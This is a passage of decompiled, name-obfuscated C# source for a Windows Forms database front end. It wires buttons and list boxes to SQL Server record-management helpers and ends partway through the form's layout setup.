using System;
using System.ComponentModel;
using System.Data.Common;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Reflection;
using System.Resources;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public sealed class GForm0 : Form
{
	public SqlConnection sqlConnection_0;

	private Class18 class18_0;

	private Class14 class14_0;

	private Class12 class12_0;

	private Class31 class31_0;

	private Class19 class19_0;

	private Class35 class35_0;

	private Class3 class3_0;

	private Class7 class7_0;

	private Class15 class15_0;

	private int int_0;

	public int int_1;

	public int int_2;

	public int int_3;

	public int int_4;

	public int int_5;

	public int int_6;

	public int int_7;

	public int int_8;

	public int int_9;

	public static bool bool_0 = true;

	public static bool bool_1 = true;

	public int int_10;

	public int int_11;

	private IContainer icontainer_0 = null;

	private EventLog eventLog_0;

	private Label label_0;

	private Label label_1;

	private Label label_2;

	private Label label_3;

	private Label label_4;

	public ListBox listBox_0;

	public Button button_0;

	public Button button_1;

	public Button button_2;

	public Button button_3;

	public Button button_4;

	public TextBox textBox_0;

	public TextBox textBox_1;

	public TextBox textBox_2;

	public TextBox textBox_3;

	public TextBox textBox_4;

	public ListBox listBox_1;

	public ListBox listBox_2;

	public ListBox listBox_3;

	public ListBox listBox_4;

	public ListBox listBox_5;

	public ListBox listBox_6;

	public Button button_5;

	public GControl3 gcontrol3_0;

	public GControl0 gcontrol0_0;

	public GControl2 gcontrol2_0;

	public GControl5 gcontrol5_0;

	public GControl4 gcontrol4_0;

	public GControl1 gcontrol1_0;

	public Button button_6;

	public Button button_7;

	public Button button_8;

	public Button button_9;

	public Button button_10;

	public Button button_11;

	public Button button_12;

	public GControl6 gcontrol6_0;

	public ListBox listBox_7;

	public Button button_13;

	public Button button_14;

	public Button button_15;

	public Button button_16;

	public Button button_17;

	private Label label_5;

	private Label label_6;

	public override DockStyle Dock
	{
		get
		{
			//IL_0001: Unknown result type (might be due to invalid IL or missing references)
			return ((Control)this).get_Dock();
		}
		set
		{
			smethod_0();
		}
	}

	public GForm0()
	{
		method_4();
		class18_0 = new Class18(this);
		class14_0 = new Class14(this);
		class12_0 = new Class12(this);
		class31_0 = new Class31(this);
		class19_0 = new Class19(this);
		class35_0 = new Class35(this);
		class3_0 = new Class3(this);
		class7_0 = new Class7(this);
		class15_0 = new Class15(this);
	}

	private void GForm0_Load(object sender, EventArgs e)
	{
		method_0();
		class14_0.method_1();
	}

	private void method_0()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		sqlConnection_0 = new SqlConnection(Class9.smethod_0(-860094650));
		try
		{
			((DbConnection)(object)sqlConnection_0).Open();
			method_2(class14_0.method_0());
		}
		catch (Exception ex)
		{
			MessageBox.Show(Class9.smethod_0(-860094519) + ex.Message);
		}
	}

	private void listBox_0_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (((ListControl)listBox_0).get_SelectedIndex() > -1)
		{
			class14_0.method_2();
			class12_0.method_1();
		}
	}

	private void button_0_Click(object sender, EventArgs e)
	{
		((Control)gcontrol1_0).Hide();
		((Control)gcontrol3_0).Hide();
		((Control)gcontrol5_0).Hide();
		((Control)gcontrol4_0).Hide();
		((Control)gcontrol2_0).Hide();
		((Control)gcontrol6_0).Hide();
		gcontrol0_0.method_21();
		((Control)gcontrol0_0).Show();
		((Control)gcontrol0_0).BringToFront();
		class18_0.method_0(listBox_1, bool_0: false);
		class18_0.method_8();
		int_9 = 1;
		class12_0.method_1();
	}

	private void listBox_1_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (((ListControl)listBox_1).get_SelectedIndex() > -1)
		{
			class12_0.method_2();
		}
	}

	private void button_1_Click(object sender, EventArgs e)
	{
		((Control)gcontrol0_0).Hide();
		((Control)gcontrol3_0).Hide();
		((Control)gcontrol5_0).Hide();
		((Control)gcontrol4_0).Hide();
		((Control)gcontrol2_0).Hide();
		((Control)gcontrol6_0).Hide();
		gcontrol1_0.method_10();
		((Control)gcontrol1_0).Show();
		((Control)gcontrol1_0).BringToFront();
		class18_0.method_0(listBox_2, bool_0: false);
		class18_0.method_8();
		((Control)button_12).set_Visible(false);
		int_9 = 2;
		class31_0.method_1();
	}

	private void listBox_2_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (((ListControl)listBox_2).get_SelectedIndex() > -1)
		{
			class31_0.method_2();
		}
	}

	private void button_2_Click(object sender, EventArgs e)
	{
		((Control)gcontrol0_0).Hide();
		((Control)gcontrol1_0).Hide();
		((Control)gcontrol5_0).Hide();
		((Control)gcontrol4_0).Hide();
		((Control)gcontrol2_0).Hide();
		((Control)gcontrol6_0).Hide();
		gcontrol3_0.method_10();
		((Control)gcontrol3_0).Show();
		((Control)gcontrol3_0).BringToFront();
		class18_0.method_0(listBox_3, bool_0: false);
		class18_0.method_8();
		int_9 = 3;
		class19_0.method_0();
	}

	private void listBox_3_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (((ListControl)listBox_3).get_SelectedIndex() > -1)
		{
			class19_0.method_1();
		}
	}

	private void button_3_Click(object sender, EventArgs e)
	{
		((Control)gcontrol0_0).Hide();
		((Control)gcontrol1_0).Hide();
		((Control)gcontrol3_0).Hide();
		((Control)gcontrol5_0).Hide();
		((Control)gcontrol2_0).Hide();
		((Control)gcontrol6_0).Hide();
		gcontrol4_0.method_6();
		((Control)gcontrol4_0).Show();
		((Control)gcontrol4_0).BringToFront();
		class18_0.method_0(listBox_5, bool_0: false);
		class18_0.method_8();
		int_9 = 4;
		class35_0.method_0();
	}

	private void listBox_5_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (((ListControl)listBox_5).get_SelectedIndex() > -1)
		{
			class35_0.method_1();
		}
	}

	private void button_4_Click(object sender, EventArgs e)
	{
		((Control)gcontrol0_0).Hide();
		((Control)gcontrol1_0).Hide();
		((Control)gcontrol3_0).Hide();
		((Control)gcontrol4_0).Hide();
		((Control)gcontrol2_0).Hide();
		((Control)gcontrol6_0).Hide();
		gcontrol5_0.method_11();
		((Control)gcontrol5_0).Show();
		((Control)gcontrol5_0).BringToFront();
		class18_0.method_0(listBox_4, bool_0: false);
		class18_0.method_8();
		int_9 = 5;
		class3_0.method_0();
	}

	private void listBox_4_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (((ListControl)listBox_4).get_SelectedIndex() > -1)
		{
			class3_0.method_1();
		}
	}

	private void button_5_Click(object sender, EventArgs e)
	{
		((Control)gcontrol0_0).Hide();
		((Control)gcontrol1_0).Hide();
		((Control)gcontrol3_0).Hide();
		((Control)gcontrol4_0).Hide();
		((Control)gcontrol5_0).Hide();
		((Control)gcontrol6_0).Hide();
		((Control)gcontrol2_0).Show();
		((Control)gcontrol2_0).BringToFront();
		gcontrol2_0.method_25();
		class18_0.method_0(listBox_6, bool_0: false);
		class18_0.method_8();
		int_9 = 6;
		class7_0.method_1();
		if (bool_0)
		{
			bool_0 = false;
			gcontrol2_0.method_1(class7_0.method_0());
		}
	}

	private void listBox_6_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (((ListControl)listBox_6).get_SelectedIndex() > -1)
		{
			class7_0.method_2();
		}
	}

	private void button_11_Click(object sender, EventArgs e)
	{
		((Control)gcontrol0_0).Hide();
		((Control)gcontrol1_0).Hide();
		((Control)gcontrol3_0).Hide();
		((Control)gcontrol4_0).Hide();
		((Control)gcontrol5_0).Hide();
		((Control)gcontrol2_0).Hide();
		((Control)gcontrol6_0).Show();
		((Control)gcontrol6_0).BringToFront();
		gcontrol6_0.method_21();
		class18_0.method_0(listBox_7, bool_0: false);
		class18_0.method_8();
		int_9 = 7;
		class15_0.method_1();
		if (bool_1)
		{
			bool_1 = false;
			gcontrol6_0.method_1(class15_0.method_0());
		}
	}

	private void listBox_7_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (((ListControl)listBox_7).get_SelectedIndex() > -1)
		{
			class15_0.method_2();
		}
	}

	private void button_7_Click(object sender, EventArgs e)
	{
		int_10 = 0;
		class18_0.method_9();
		class18_0.method_15();
		class18_0.method_12();
		class18_0.method_10();
		class18_0.method_17();
		class18_0.method_1(int_9);
		class12_0.method_10();
		class7_0.method_8();
		if (int_9 == 2)
		{
			gcontrol1_0.method_1(class31_0.method_0());
		}
		else if (int_9 == 1)
		{
			gcontrol0_0.method_1(class12_0.method_0());
			gcontrol0_0.method_8(gcontrol0_0.method_0().ToString());
		}
	}

	private void button_6_Click(object sender, EventArgs e)
	{
		int_10 = 1;
		class18_0.method_15();
		class18_0.method_12();
		class18_0.method_10();
		class18_0.method_17();
		class18_0.method_2(int_9);
	}

	private void button_8_Click(object sender, EventArgs e)
	{
		int_10 = 3;
		class18_0.method_12();
		class18_0.method_10();
		class18_0.method_15();
	}

	private void button_12_Click(object sender, EventArgs e)
	{
		int_10 = 2;
		class18_0.method_15();
		class18_0.method_10();
		class18_0.method_9();
		class18_0.method_17();
		class18_0.method_12();
		class18_0.method_3(int_9);
	}

	private void button_10_Click(object sender, EventArgs e)
	{
		//IL_03bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c3: Expected O, but got Unknown
		if (int_10 == 0)
		{
			if (int_9 == 1)
			{
				class12_0.method_4();
			}
			else if (int_9 == 2)
			{
				class31_0.method_4();
			}
			else if (int_9 == 3)
			{
				class19_0.method_3();
			}
			else if (int_9 == 4)
			{
				class35_0.method_3();
			}
			else if (int_9 == 5)
			{
				class3_0.method_3();
			}
			else if (int_9 == 6)
			{
				class7_0.method_4();
			}
			else if (int_9 == 7)
			{
				class15_0.method_4();
			}
		}
		else if (int_10 == 1)
		{
			if (int_9 == 1)
			{
				class12_0.method_5();
			}
			else if (int_9 == 2)
			{
				class31_0.method_5();
			}
			else if (int_9 == 3)
			{
				class19_0.method_4();
			}
			else if (int_9 == 4)
			{
				class35_0.method_4();
			}
			else if (int_9 == 5)
			{
				class3_0.method_4();
			}
			else if (int_9 == 6)
			{
				class7_0.method_5();
			}
			else if (int_9 == 7)
			{
				class15_0.method_5();
			}
		}
		else if (int_10 == 2)
		{
			if (int_9 == 1)
			{
				class12_0.method_8();
			}
			else if (int_9 == 2)
			{
				class31_0.method_8();
			}
			else if (int_9 == 3)
			{
				class19_0.method_8();
			}
			else if (int_9 == 4)
			{
				class35_0.method_7();
			}
			else if (int_9 == 5)
			{
				class3_0.method_6();
			}
			else if (int_9 == 6)
			{
				class7_0.method_7();
			}
			else if (int_9 == 7)
			{
				class15_0.method_7();
			}
		}
		else if (int_10 == 3)
		{
			if (int_9 == 1)
			{
				class12_0.method_6();
			}
			else if (int_9 == 2)
			{
				class31_0.method_6(((Class5)listBox_2.get_SelectedItem()).method_0());
			}
			else if (int_9 == 3)
			{
				class19_0.method_5();
			}
			else if (int_9 == 4)
			{
				class35_0.method_5(((Class17)listBox_5.get_SelectedItem()).method_0());
			}
			else if (int_9 == 5)
			{
				class3_0.method_5();
			}
			else if (int_9 == 6)
			{
				class7_0.method_6();
			}
			else if (int_9 == 7)
			{
				class15_0.method_6();
			}
		}
		class18_0.method_11();
		class18_0.method_13();
		class18_0.method_6();
		class18_0.method_4(int_9);
		class18_0.method_8();
		if (int_9 == 1 || int_9 == 4)
		{
			((DbConnection)(object)sqlConnection_0).Open();
			SqlCommand val = new SqlCommand(Class9.smethod_0(-860094524), sqlConnection_0);
			val.get_Parameters().AddWithValue(Class9.smethod_0(-860094543), (object)((Control)textBox_4).get_Text());
			((Control)textBox_0).set_Text(((DbCommand)(object)val).ExecuteScalar()!.ToString());
			((DbConnection)(object)sqlConnection_0).Close();
		}
	}

	private void button_9_Click(object sender, EventArgs e)
	{
		class18_0.method_11();
		class18_0.method_8();
		class18_0.method_13();
		class18_0.method_6();
		class18_0.method_4(int_9);
		class18_0.method_9();
		class18_0.method_19();
	}

	private void button_15_Click(object sender, EventArgs e)
	{
		int_11 = 0;
		((ListControl)listBox_0).set_SelectedIndex(-1);
		class14_0.method_9();
		((Control)textBox_4).set_Text(method_1().ToString());
		class14_0.method_8();
		class14_0.method_13();
		class18_0.method_12();
		class18_0.method_10();
		class18_0.method_14();
	}

	private void button_14_Click(object sender, EventArgs e)
	{
		int_11 = 1;
		class14_0.method_8();
		class14_0.method_13();
		class18_0.method_12();
		class18_0.method_10();
		class18_0.method_14();
	}

	private void button_13_Click(object sender, EventArgs e)
	{
		int_11 = 2;
		class18_0.method_5();
		class14_0.method_16();
		class14_0.method_19();
		class18_0.method_10();
		class14_0.method_18();
		class14_0.method_3(null);
		class14_0.method_17();
		class18_0.method_12();
		class14_0.method_7();
		class14_0.method_13();
		class18_0.method_14();
	}

	private void button_17_Click(object sender, EventArgs e)
	{
		if (int_11 == 0)
		{
			if (((Control)textBox_3).get_Text() == string.Empty)
			{
				((Control)textBox_3).set_Text(Class9.smethod_0(-860094592));
			}
			class14_0.method_4();
		}
		else if (int_11 == 1)
		{
			if (((Control)textBox_3).get_Text() == string.Empty)
			{
				((Control)textBox_3).set_Text(Class9.smethod_0(-860094592));
			}
			class14_0.method_5();
		}
		else if (int_11 == 2)
		{
			class14_0.method_6();
		}
		class18_0.method_5();
		class14_0.method_9();
		class14_0.method_19();
		class18_0.method_14();
		class18_0.method_11();
		class14_0.method_18();
		class14_0.method_3(null);
		class14_0.method_17();
		class18_0.method_13();
		class14_0.method_7();
		class14_0.method_15();
	}

	private void button_16_Click(object sender, EventArgs e)
	{
		class18_0.method_5();
		class14_0.method_16();
		class14_0.method_19();
		class18_0.method_14();
		class18_0.method_10();
		class14_0.method_18();
		class14_0.method_3(null);
		class14_0.method_17();
		class18_0.method_13();
		class14_0.method_7();
		class14_0.method_14();
		class14_0.method_9();
		((ListControl)listBox_0).set_SelectedIndex(-1);
	}

	public int method_1()
	{
		return int_0;
	}

	public void method_2(int int_12)
	{
		int_0 = int_12;
	}

	public void method_3()
	{
		int_0++;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void method_4()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		//IL_0145: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Expected O, but got Unknown
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Expected O, but got Unknown
		//IL_015b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Expected O, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Expected O, but got Unknown
		//IL_017c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0186: Expected O, but got Unknown
		//IL_0187: Unknown result type (might be due to invalid IL or missing references)
		//IL_0191: Expected O, but got Unknown
		//IL_0192: Unknown result type (might be due to invalid IL or missing references)
		//IL_019c: Expected O, but got Unknown
		//IL_019d: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a7: Expected O, but got Unknown
		//IL_01a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b2: Expected O, but got Unknown
		//IL_01b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bd: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(GForm0));
		listBox_0 = new ListBox();
		button_0 = new Button();
		button_1 = new Button();
		button_2 = new Button();
		button_3 = new Button();
		button_4 = new Button();
		eventLog_0 = new EventLog();
		textBox_0 = new TextBox();
		label_0 = new Label();
		textBox_1 = new TextBox();
		label_1 = new Label();
		textBox_2 = new TextBox();
		label_2 = new Label();
		textBox_3 = new TextBox();
		label_3 = new Label();
		textBox_4 = new TextBox();
		label_4 = new Label();
		listBox_1 = new ListBox();
		listBox_2 = new ListBox();
		listBox_3 = new ListBox();
		listBox_4 = new ListBox();
		listBox_5 = new ListBox();
		button_5 = new Button();
		listBox_6 = new ListBox();
		button_7 = new Button();
		button_6 = new Button();
		button_8 = new Button();
		button_10 = new Button();
		button_9 = new Button();
		button_11 = new Button();
		button_12 = new Button();
		listBox_7 = new ListBox();
		button_15 = new Button();
		button_14 = new Button();
		button_13 = new Button();
		button_17 = new Button();
		button_16 = new Button();
		label_5 = new Label();
		label_6 = new Label();
		gcontrol1_0 = new GControl1();
		gcontrol3_0 = new GControl3();
		gcontrol5_0 = new GControl5();
		gcontrol4_0 = new GControl4();
		gcontrol6_0 = new GControl6();
		gcontrol0_0 = new GControl0();
		gcontrol2_0 = new GControl2();
		((ISupportInitialize)eventLog_0).BeginInit();
		((Control)this).SuspendLayout();
		((ListControl)listBox_0).set_FormattingEnabled(true);
		componentResourceManager.ApplyResources(listBox_0, Class9.smethod_0(-860096201));
		((Control)listBox_0).set_Name(Class9.smethod_0(-860096201));
		listBox_0.add_SelectedIndexChanged((EventHandler)listBox_0_SelectedIndexChanged);
		componentResourceManager.ApplyResources(button_0, Class9.smethod_0(-860094563));
		((Control)button_0).set_Name(Class9.smethod_0(-860094563));
		((ButtonBase)button_0).set_UseVisualStyleBackColor(true);
		((Control)button_0).add_Click((EventHandler)button_0_Click);
		componentResourceManager.ApplyResources(button_1, Class9.smethod_0(-860094865));
		((Control)button_1).set_Name(Class9.smethod_0(-860094865));
		((ButtonBase)button_1).set_UseVisualStyleBackColor(true);
		((Control)button_1).add_Click((EventHandler)button_1_Click);
		componentResourceManager.ApplyResources(button_2, Class9.smethod_0(-860094855));
		((Control)button_2).set_Name(Class9.smethod_0(-860094855));
		((ButtonBase)button_2).set_UseVisualStyleBackColor(true);
		((Control)button_2).add_Click((EventHandler)button_2_Click);
		componentResourceManager.ApplyResources(button_3, Class9.smethod_0(-860094901));
		((Control)button_3).set_Name(Class9.smethod_0(-860094901));
		((ButtonBase)button_3).set_UseVisualStyleBackColor(true);
		((Control)button_3).add_Click((EventHandler)button_3_Click);
		componentResourceManager.ApplyResources(button_4, Class9.smethod_0(-860094907));
		((Control)button_4).set_Name(Class9.smethod_0(-860094907));
		((ButtonBase)button_4).set_UseVisualStyleBackColor(true);
		((Control)button_4).add_Click((EventHandler)button_4_Click);
		eventLog_0.set_SynchronizingObject((ISynchronizeInvoke)(object)this);
		componentResourceManager.ApplyResources(textBox_0, Class9.smethod_0(-860094889));
		((Control)textBox_0).set_Name(Class9.smethod_0(-860094889));
		((TextBoxBase)textBox_0).set_ReadOnly(true);
		componentResourceManager.ApplyResources(label_0, Class9.smethod_0(-860095739));
		((Control)label_0).set_Name(Class9.smethod_0(-860095739));
		componentResourceManager.ApplyResources(textBox_1, Class9.smethod_0(-860094925));
		((Control)textBox_1).set_Name(Class9.smethod_0(-860094925));
		componentResourceManager.ApplyResources(label_1, Class9.smethod_0(-860094945));
		((Control)label_1).set_Name(Class9.smethod_0(-860094945));
		componentResourceManager.ApplyResources(textBox_2, Class9.smethod_0(-860094742));
		((Control)textBox_2).set_Name(Class9.smethod_0(-860094742));
		componentResourceManager.ApplyResources(label_2, Class9.smethod_0(-860094723));
		((Control)label_2).set_Name(Class9.smethod_0(-860094723));
		componentResourceManager.ApplyResources(textBox_3, Class9.smethod_0(-860094776));
		((Control)textBox_3).set_Name(Class9.smethod_0(-860094776));
		componentResourceManager.ApplyResources(label_3, Class9.smethod_0(-860095944));
		((Control)label_3).set_Name(Class9.smethod_0(-860095944));
		componentResourceManager.ApplyResources(textBox_4, Class9.smethod_0(-860094765));
		((Control)textBox_4).set_Name(Class9.smethod_0(-860094765));
		componentResourceManager.ApplyResources(label_4, Class9.smethod_0(-860095845));
		((Control)label_4).set_Name(Class9.smethod_0(-860095845));
		((ListControl)listBox_1).set_FormattingEnabled(true);
		componentResourceManager.ApplyResources(listBox_1, Class9.smethod_0(-860094816));
		((Control)listBox_1).set_Name(Class9.smethod_0(-860094816));
		listBox_1.add_SelectedIndexChanged((EventHandler)listBox_1_SelectedIndexChanged);
		((ListControl)listBox_2).set_FormattingEnabled(true);
		componentResourceManager.ApplyResources(listBox_2, Class9.smethod_0(-860094799));
		((Control)listBox_2).set_Name(Class9.smethod_0(-860094799));
		listBox_2.add_SelectedIndexChanged((EventHandler)listBox_2_SelectedIndexChanged);
		((ListControl)listBox_3).set_FormattingEnabled(true);
		componentResourceManager.ApplyResources(listBox_3, Class9.smethod_0(-860094846));
		((Control)listBox_3).set_Name(Class9.smethod_0(-860094846));
		listBox_3.add_SelectedIndexChanged((EventHandler)listBox_3_SelectedIndexChanged);
		((ListControl)listBox_4).set_FormattingEnabled(true);
		componentResourceManager.ApplyResources(listBox_4, Class9.smethod_0(-860094829));
		((Control)listBox_4).set_Name(Class9.smethod_0(-860094829));
		listBox_4.add_SelectedIndexChanged((EventHandler)listBox_4_SelectedIndexChanged);
		((ListControl)listBox_5).set_FormattingEnabled(true);
		componentResourceManager.ApplyResources(listBox_5, Class9.smethod_0(-860095124));
		((Control)listBox_5).set_Name(Class9.smethod_0(-860095124));
		listBox_5.add_SelectedIndexChanged((EventHandler)listBox_5_SelectedIndexChanged);
		componentResourceManager.ApplyResources(button_5, Class9.smethod_0(-860095107));
		((Control)button_5).set_Name(Class9.smethod_0(-860095107));
		((ButtonBase)button_5).set_UseVisualStyleBackColor(true);
		((Control)button_5).add_Click((EventHandler)button_5_Click);
		((ListControl)listBox_6).set_FormattingEnabled(true);
		componentResourceManager.ApplyResources(listBox_6, Class9.smethod_0(-860095153));
		((Control)listBox_6).set_Name(Class9.smethod_0(-860095153));
		listBox_6.add_SelectedIndexChanged((EventHandler)listBox_6_SelectedIndexChanged);
		componentResourceManager.ApplyResources(button_7, Class9.smethod_0(-860095144));
		((Control)button_7).set_Name(Class9.smethod_0(-860095144));
		((ButtonBase)button_7).set_UseVisualStyleBackColor(true);
		((Control)button_7).add_Click((EventHandler)button_7_Click);
		componentResourceManager.ApplyResources(button_6, Class9.smethod_0(-860095189));
		((Control)button_6).set_Name(Class9.smethod_0(-860095189));
		((ButtonBase)button_6).set_UseVisualStyleBackColor(true);
		((Control)button_6).add_Click((EventHandler)button_6_Click);
		componentResourceManager.ApplyResources(button_8, Class9.smethod_0(-860095195));
		((Control)button_8).set_Name(Class9.smethod_0(-860095195));
		((ButtonBase)button_8).set_UseVisualStyleBackColor(true);
		((Control)button_8).add_Click((EventHandler)button_8_Click);
		componentResourceManager.ApplyResources(button_10, Class9.smethod_0(-860095179));
		((Control)button_10).set_Name(Class9.smethod_0(-860095179));
		((ButtonBase)button_10).set_UseVisualStyleBackColor(true);
		((Control)button_10).add_Click((EventHandler)button_10_Click);
		componentResourceManager.ApplyResources(button_9, Class9.smethod_0(-860095228));
		((Control)button_9).set_Name(Class9.smethod_0(-860095228));
		((ButtonBase)button_9).set_UseVisualStyleBackColor(true);
		((Control)button_9).add_Click((EventHandler)button_9_Click);
		componentResourceManager.ApplyResources(button_11, Class9.smethod_0(-860095212));
		((Control)button_11).set_Name(Class9.smethod_0(-860095212));
		((ButtonBase)button_11).set_UseVisualStyleBackColor(true);
		((Control)button_11).add_Click((EventHandler)button_11_Click);
		componentResourceManager.ApplyResources(button_12, Class9.smethod_0(-860095002));
		((Control)button_12).set_Name(Class9.smethod_0(-860095002));
		((ButtonBase)button_12).set_UseVisualStyleBackColor(true);
		((Control)button_12).add_Click((EventHandler)button_12_Click);
		((ListControl)listBox_7).set_FormattingEnabled(true);
		componentResourceManager.ApplyResources(listBox_7, Class9.smethod_0(-860094986));
		((Control)listBox_7).set_Name(Class9.smethod_0(-860094986));
		listBox_7.add_SelectedIndexChanged((EventHandler)listBox_7_SelectedIndexChanged);
		componentResourceManager.ApplyResources(button_15, Class9.smethod_0(-860095033));
		((Control)button_15).set_Name(Class9.smethod_0(-860095033));
		((ButtonBase)button_15).set_UseVisualStyleBackColor(true);
		((Control)button_15).add_Click((EventHandler)button_15_Click);
		componentResourceManager.ApplyResources(button_14, Class9.smethod_0(-860095020));
		((Control)button_14).set_Name(Class9.smethod_0(-860095020));
		((ButtonBase)button_14).set_UseVisualStyleBackColor(true);
		((Control)button_14).add_Click((EventHandler)button_14_Click);
		componentResourceManager.ApplyResources(button_13, Class9.smethod_0(-860095048));
		((Control)button_13).set_Name(Class9.smethod_0(-860095048));
		((ButtonBase)button_13).set_UseVisualStyleBackColor(true);
		((Control)button_13).add_Click((EventHandler)button_13_Click);
		componentResourceManager.ApplyResources(button_17, Class9.smethod_0(-860095102));
		((Control)button_17).set_Name(Class9.smethod_0(-860095102));
		((ButtonBase)button_17).set_UseVisualStyleBackColor(true);
		((Control)button_17).add_Click((EventHandler)button_17_Click);
		componentResourceManager.ApplyResources(button_16, Class9.smethod_0(-860095381));
		((Control)button_16).set_Name(Class9.smethod_0(-860095381));
		((ButtonBase)button_16).set_UseVisualStyleBackColor(true);
		((Control)button_16).add_Click((EventHandler)button_16_Click);
		componentResourceManager.ApplyResources(label_5, Class9.smethod_0(-860095892));
		((Control)label_5).set_Name(Class9.smethod_0(-860095892));
		componentResourceManager.ApplyResources(label_6, Class9.smethod_0(-860095531));
		((Control)label_6).set_Name(Class9.smethod_0(-860095531));
		componentResourceManager.ApplyResources(gcontrol1_0, Class9.smethod_0(-860095373));
		((Control)gcontrol1_0).set_Name(Class9.smethod_0(-860095373));
		componentResourceManager.ApplyResources(gcontrol3_0, Class9.smethod_0(-860095418));
		((Control)gcontrol3_0).set_Name(Class9.smethod_0(-860095418));
		componentResourceManager.ApplyResources(gcontrol5_0, Class9.smethod_0(-860095445));
		((Control)gcontrol5_0).set_Name(Class9.smethod_0(-860095445));
		componentResourceManager.ApplyResources(gcontrol4_0, Class9.smethod_0(-860095452));
		((Control)gcontrol4_0).set_Name(Class9.smethod_0(-860095452));
		componentResourceManager.ApplyResources(gcontrol6_0, Class9.smethod_0(-860095436));
		((Control)gcontrol6_0).set_Name(Class9.smethod_0(-860095436));
		componentResourceManager.ApplyResources(gcontrol0_0, Class9.smethod_0(-860095470));
		((Control)gcontrol0_0).set_Name(Class9.smethod_0(-860095470));
		componentResourceManager.ApplyResources(gcontrol2_0, Class9.smethod_0(-860095251));
		((Control)gcontrol2_0).set_Name(Class9.smethod_0(-860095251));
		componentResourceManager.ApplyResources(this, Class9.smethod_0(-860095247));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).get_Controls().Add((Control)(object)label_6);
		((Control)this).get_Controls().Add((Control)(object)label_5);
		((Control)this).get_Controls().Add((Control)(object)button_16);
		((Control)this).get_Controls().Add((Control)(object)button_17);
		((Control)this).get_Controls().Add((Control)(object)button_13);
		((Control)this).get_Controls().Add((Control)(object)button_14);
		((Control)this).get_Controls().Add((Control)(object)button_15);
		((Control)this).get_Controls().Add((Control)(object)button_12);
		((Control)this).get_Controls().Add((Control)(object)button_11);
		((Control)this).get_Controls().Add((Control)(object)button_8);
		((Control)this).get_Controls().Add((Control)(object)button_6);
		((Control)this).get_Controls().Add((Control)(object)button_7);
		((Control)this).get_Controls().Add((Control)(object)button_5);
		((Control)this).get_Controls().Add((Control)(object)textBox_0);
